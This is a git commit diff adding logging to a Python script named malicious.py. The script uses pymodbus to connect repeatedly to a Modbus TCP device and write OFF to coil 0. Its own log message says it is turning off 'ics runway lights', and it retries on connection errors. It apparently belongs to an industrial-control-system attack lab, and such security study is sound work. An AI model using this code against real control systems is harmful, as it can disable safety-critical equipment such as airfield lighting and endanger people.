1a0a71833682c4b4a43e06519406b35b4296999f
DanAun <23170040+DanAun@users.noreply.github.com>
2025-06-30 09:47:04 +0200

    Improve: logging in mal

--- malicious/malicious.py
+++ malicious/malicious.py
@@ -1,3 +1,12 @@
+import logging
+# --- Logging Setup ---
+logging.basicConfig(
+    level=logging.INFO,  # Set the logging level
+    format='%(asctime)s - [MAL] - %(levelname)s: %(message)s',  # Custom format
+    datefmt='%H:%M:%S'  # Display only hour, minute, and second
+)
+log = logging.getLogger("MAL")  # Create a custom logger
+
 import pymodbus.exceptions
 from pymodbus.client import ModbusTcpClient
 import time
@@ -16,11 +25,11 @@ def loop_modbus_request():
             client.connect()
             
             # Write 0 (OFF) to coil at address 0
+            log.info("Sending turn off signal to ics runway lights")
             client.write_coil(0, False)
         
         except pymodbus.exceptions.ConnectionException as e:
-            print(f"Connection error: {e}")
-            print("Retrying in %d seconds..." % RETRY_DELAY)
+            # pymodbus already logs connection errors
             time.sleep(RETRY_DELAY)
         finally:
             client.close()
@@ -32,4 +41,4 @@ if __name__ == "__main__":
     try:
         loop_modbus_request()
     except KeyboardInterrupt:
-        print("Script stopped by user")
+        log.info("Script stopped by user")
